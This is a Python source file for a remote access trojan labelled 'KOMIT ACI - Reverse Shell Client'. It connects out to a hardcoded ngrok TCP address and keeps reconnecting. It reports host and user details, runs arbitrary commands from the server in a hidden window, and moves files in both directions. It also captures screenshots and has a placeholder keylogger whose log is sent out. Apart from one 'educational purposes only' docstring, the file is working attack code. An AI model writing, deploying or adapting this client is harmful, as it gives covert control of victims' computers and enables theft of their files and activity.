import socket
import subprocess
import os
import sys
import json
import base64
import shlex
import tempfile
import time
import platform
from datetime import datetime
from urllib.parse import urlparse

class ReverseShellClient:
    def __init__(self, server_address, server_port=None):
        """
        server_address bisa berupa:
        - IP address: "192.168.1.100"
        - Ngrok URL: "tcp://0.tcp.ngrok.io:12345"
        """
        self.server_address = server_address
        self.server_port = server_port
        self.current_dir = os.getcwd()
        self.socket = None
        self.keylogger_active = False
        self.keylog_file = None
        
       
        if server_port is None and "://" in server_address:
            parsed = urlparse(server_address)
            if parsed.scheme == "tcp":
                self.server_host = parsed.hostname
                self.server_port = parsed.port
                self.connection_mode = "ngrok"
                print(f"[+] Using Ngrok URL: {server_address}")
            else:
                raise ValueError(f"Unsupported URL scheme: {parsed.scheme}")
        else:
            self.server_host = server_address
            self.server_port = server_port
            self.connection_mode = "local"
        
    def connect(self):
        """Establish connection to server"""
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.socket.settimeout(30)
                self.socket.connect((self.server_host, self.server_port))
                self.send_system_info()
                
                if self.connection_mode == "ngrok":
                    print(f"[+] Connected via Ngrok to {self.server_host}:{self.server_port}")
                else:
                    print(f"[+] Connected to {self.server_host}:{self.server_port}")
                    
                return True
            except Exception as e:
                print(f"[-] Connection failed: {e}. Retrying in 5 seconds...")
                time.sleep(5)
                continue
    
    def send_system_info(self):
        """Send system information to server"""
        info = {
            "type": "system_info",
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "user": os.getenv('USERNAME') or os.getenv('USER'),
            "current_dir": self.current_dir,
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "connection_mode": self.connection_mode
        }
        self.send_json(info)
    
    def send_json(self, data):
        """Send JSON data to server"""
        try:
            json_data = json.dumps(data)
            self.socket.send(json_data.encode())  
        except Exception as e:
            print(f"Error sending JSON: {e}")
    
    def change_directory(self, path):
        """Change current directory"""
        try:
            if path == "..":
                self.current_dir = os.path.dirname(self.current_dir)
            elif os.path.isabs(path):
                self.current_dir = path
            else:
                self.current_dir = os.path.join(self.current_dir, path)
            
            os.chdir(self.current_dir)
            return f"Changed directory to: {self.current_dir}"
        except Exception as e:
            return f"Error changing directory: {str(e)}"
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            if command.lower().startswith("cd "):
                path = command[3:].strip()
                return self.change_directory(path)
            
            if command.lower() in ["pwd", "get-location"]:
                return f"Current directory: {self.current_dir}"
            
           
            if command.lower() == "systeminfo":
                return self.get_system_info()
            elif command.lower() == "tasklist":
                command = "tasklist" if platform.system() == "Windows" else "ps aux"
            
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    command,
                    shell=True,
                    cwd=self.current_dir,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                process = subprocess.Popen(
                    shlex.split(command),
                    cwd=self.current_dir,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
            
            output, error = process.communicate(timeout=30)
            
            if output:
                return output.decode('utf-8', errors='ignore')
            elif error:
                return error.decode('utf-8', errors='ignore')
            else:
                return "Command executed successfully"
                
        except subprocess.TimeoutExpired:
            process.kill()
            return "Command timeout after 30 seconds"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def list_files(self):
        """List files in current directory"""
        try:
            files = os.listdir(self.current_dir)
            result = f"Files in {self.current_dir}:\n"
            result += "-" * 50 + "\n"
            
            for file in files:
                filepath = os.path.join(self.current_dir, file)
                try:
                    if os.path.isdir(filepath):
                        result += f"[DIR]  {file}/\n"
                    else:
                        size = os.path.getsize(filepath)
                        if size < 1024:
                            size_str = f"{size} B"
                        elif size < 1024*1024:
                            size_str = f"{size/1024:.1f} KB"
                        else:
                            size_str = f"{size/(1024*1024):.1f} MB"
                        
                        modified = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%Y-%m-%d %H:%M')
                        result += f"[FILE] {file} ({size_str}, modified: {modified})\n"
                except:
                    result += f"[?] {file}\n"
            
            return result
        except Exception as e:
            return f"Error listing files: {str(e)}"
    
    def upload_file(self, filename, data):
        """Upload file from server to client"""
        try:
            filename = os.path.basename(filename)
            filepath = os.path.join(self.current_dir, filename)
            
            if os.path.exists(filepath):
                backup_path = filepath + ".bak"
                os.rename(filepath, backup_path)
            
            with open(filepath, "wb") as f:
                f.write(base64.b64decode(data))
            
            return f"File uploaded successfully: {filename}"
        except Exception as e:
            return f"Error uploading file: {str(e)}"
    
    def download_file(self, filename):
        """Download file from client to server"""
        try:
            filename = os.path.basename(filename)
            filepath = os.path.join(self.current_dir, filename)
            
            if os.path.exists(filepath):
                with open(filepath, "rb") as f:
                    file_data = f.read()
                
                return {
                    "type": "file_data",
                    "filename": filename,
                    "data": base64.b64encode(file_data).decode(),
                    "size": len(file_data)
                }
            else:
                return {"type": "error", "error": f"File not found: {filename}"}
        except Exception as e:
            return {"type": "error", "error": f"Error downloading file: {str(e)}"}
    
    def get_system_info(self):
        """Get detailed system information"""
        try:
            import wmi  
            
            info = f"""
[SYSTEM INFORMATION]
{'='*50}
Hostname: {socket.gethostname()}
Platform: {platform.platform()}
System: {platform.system()}
Release: {platform.release()}
Version: {platform.version()}
Processor: {platform.processor() or 'Unknown'}
Architecture: {platform.architecture()[0]}
Machine: {platform.machine()}

[USER INFORMATION]
{'='*50}
Username: {os.getenv('USERNAME') or os.getenv('USER')}
User Profile: {os.path.expanduser('~')}
Current Directory: {self.current_dir}
Privileges: {"Administrator" if self.is_admin() else "User"}

[PYTHON INFORMATION]
{'='*50}
Python Version: {platform.python_version()}
Python Implementation: {platform.python_implementation()}
Python Executable: {sys.executable}

[NETWORK INFORMATION]
{'='*50}
Local IP: {socket.gethostbyname(socket.gethostname())}
"""
            return info
        except Exception as e:
            
            return f"""
[SYSTEM INFORMATION]
Hostname: {socket.gethostname()}
Platform: {platform.platform()}
User: {os.getenv('USERNAME') or os.getenv('USER')}
Current Directory: {self.current_dir}
Python Version: {platform.python_version()}
"""
    
    def is_admin(self):
        """Check if running as administrator"""
        try:
            if platform.system() == "Windows":
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def start_keylogger(self):
        """Start keylogger (educational purposes only)"""
        try:
            self.keylog_file = os.path.join(tempfile.gettempdir(), f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

            with open(self.keylog_file, "w") as f:
                f.write("Keylogger placeholder - requires pynput library\n")
                f.write(f"Started at: {datetime.now()}\n")
            
            return "Keylogger started (placeholder)"
        except Exception as e:
            return f"Error starting keylogger: {str(e)}"
    
    def stop_keylogger(self):
        """Stop keylogger"""
        self.keylogger_active = False
        if self.keylog_file and os.path.exists(self.keylog_file):
            try:
                with open(self.keylog_file, "rb") as f:
                    data = f.read()
                os.remove(self.keylog_file)
                return {
                    "type": "keylog_data",
                    "filename": os.path.basename(self.keylog_file),
                    "data": base64.b64encode(data).decode()
                }
            except:
                pass
        return "Keylogger stopped or not active"
    
    def take_screenshot(self):
        """Take screenshot using PIL/Pillow"""
        try:
            from PIL import ImageGrab
            import io
            
            screenshot = ImageGrab.grab()
            
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr = img_byte_arr.getvalue()
            
            filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            
            return {
                "type": "screenshot",
                "filename": filename,
                "data": base64.b64encode(img_byte_arr).decode('utf-8'),
                "size": len(img_byte_arr)
            }
            
        except ImportError as e:
            return f"ERROR: PIL/Pillow not installed. {str(e)}"
        except Exception as e:
            return f"ERROR taking screenshot: {str(e)}"
    
    def handle_command(self, command_data):
        """Handle incoming commands from server"""
        try:
            cmd_type = command_data.get("type")
            
            if cmd_type == "command":
                command = command_data.get("command", "").strip()
                
               
                if command.lower() == "systeminfo":
                    output = self.get_system_info()
                elif command.lower() == "screenshot":
                    output = self.take_screenshot()
                    if isinstance(output, dict):
                        self.send_json(output)
                        return
                elif command.lower() == "keylogger_start":
                    output = self.start_keylogger()
                elif command.lower() == "keylogger_stop":
                    output = self.stop_keylogger()
                    if isinstance(output, dict):
                        self.send_json(output)
                        return
                elif command.lower() in ["dir", "ls", "list"]:
                    output = self.list_files()
                elif command.lower() == "cd":
                    output = f"Current directory: {self.current_dir}"
                elif command.lower() == "tasklist":
                    output = self.execute_command("tasklist")
                elif command.lower() in ["exit", "quit"]:
                    output = "Disconnecting..."
                    response = {
                        "type": "command_output",
                        "output": output,
                        "current_dir": self.current_dir
                    }
                    self.send_json(response)
                    time.sleep(1)
                    sys.exit(0)
                else:
                    output = self.execute_command(command)
                
              
                response = {
                    "type": "command_output",
                    "output": output,
                    "current_dir": self.current_dir
                }
                self.send_json(response)
            
            elif cmd_type == "upload":
                filename = command_data.get("filename")
                data = command_data.get("data")
                output = self.upload_file(filename, data)
                response = {
                    "type": "command_output",
                    "output": output,
                    "current_dir": self.current_dir
                }
                self.send_json(response)
            
            elif cmd_type == "download":
                filename = command_data.get("filename")
                result = self.download_file(filename)
                self.send_json(result)
        
        except Exception as e:
            error_response = {
                "type": "error",
                "error": str(e),
                "current_dir": self.current_dir
            }
            self.send_json(error_response)
    
    def run(self):
        """Main client loop"""
        while True:
            try:
               
                self.socket.settimeout(30)
                data = self.socket.recv(1024*1024) 
                
                if not data:
                    print("Server disconnected. Reconnecting...")
                    time.sleep(5)
                    self.connect()
                    continue
                
              
                try:
                    command_data = json.loads(data.decode())
                    self.handle_command(command_data)
                    
                except json.JSONDecodeError:
                    
                    command = data.decode().strip()
                    if command:
                        output = self.execute_command(command)
                        response = {
                            "type": "command_output",
                            "output": output,
                            "current_dir": self.current_dir
                        }
                        self.send_json(response)
                
            except socket.timeout:
               
                try:
                    heartbeat = {"type": "heartbeat", "timestamp": datetime.now().isoformat()}
                    self.send_json(heartbeat)
                except:
                    pass
                continue
                
            except Exception as e:
                print(f"Error in main loop: {e}. Reconnecting in 10 seconds...")
                time.sleep(10)
                try:
                    self.connect()
                except:
                    pass
    def change_directory(self, path):
        """Change current directory"""
        try:
            if path == "..":
                self.current_dir = os.path.dirname(self.current_dir)
            elif os.path.isabs(path):
                self.current_dir = path
            else:
                self.current_dir = os.path.join(self.current_dir, path)
            
            os.chdir(self.current_dir)
            return f"Changed directory to: {self.current_dir}"
        except Exception as e:
            return f"Error changing directory: {str(e)}"
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            if command.lower().startswith("cd "):
                path = command[3:].strip()
                return self.change_directory(path)
            
            if command.lower() in ["pwd", "get-location"]:
                return f"Current directory: {self.current_dir}"
            
            if command.lower() == "systeminfo":
                return self.get_system_info()
            elif command.lower() == "tasklist":
                command = "tasklist" if platform.system() == "Windows" else "ps aux"
            
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    command,
                    shell=True,
                    cwd=self.current_dir,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                process = subprocess.Popen(
                    shlex.split(command),
                    cwd=self.current_dir,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
            
            output, error = process.communicate(timeout=30)
            
            if output:
                return output.decode('utf-8', errors='ignore')
            elif error:
                return error.decode('utf-8', errors='ignore')
            else:
                return "Command executed successfully"
                
        except subprocess.TimeoutExpired:
            process.kill()
            return "Command timeout after 30 seconds"
        except Exception as e:
            return f"Error executing command: {str(e)}"

def main():
    print("=" * 60)
    print("KOMIT ACI - Reverse Shell Client")
    print("=" * 60)
    
    NGROK_URL = "tcp://0.tcp.ap.ngrok.io:17290" 
    
    if not NGROK_URL:
        print("❌ Ngrok URL not configured!")
        print("Please edit client.py and set NGROK_URL variable")
        time.sleep(5)
        sys.exit(1)
    
    print(f"\n[+] Using Ngrok URL: {NGROK_URL}")
    print("[+] Starting client in auto-connect mode...")
    
    try:
        client = ReverseShellClient(NGROK_URL)
    except ValueError as e:
        print(f"❌ Error: {e}")
        time.sleep(5)
        sys.exit(1)
    
    while True:
        try:
            print("Attempting to connect to server via Ngrok...")
            if client.connect():
                print("✅ Connected successfully via Ngrok!")
                print("📡 Waiting for commands...")
                client.run()
        except KeyboardInterrupt:
            print("\n👋 Client stopped by user")
            sys.exit(0)
        except Exception as e:
            print(f"❌ Connection error: {e}")
            print("🔄 Reconnecting in 10 seconds...")
            time.sleep(10)

if __name__ == "__main__":
    main()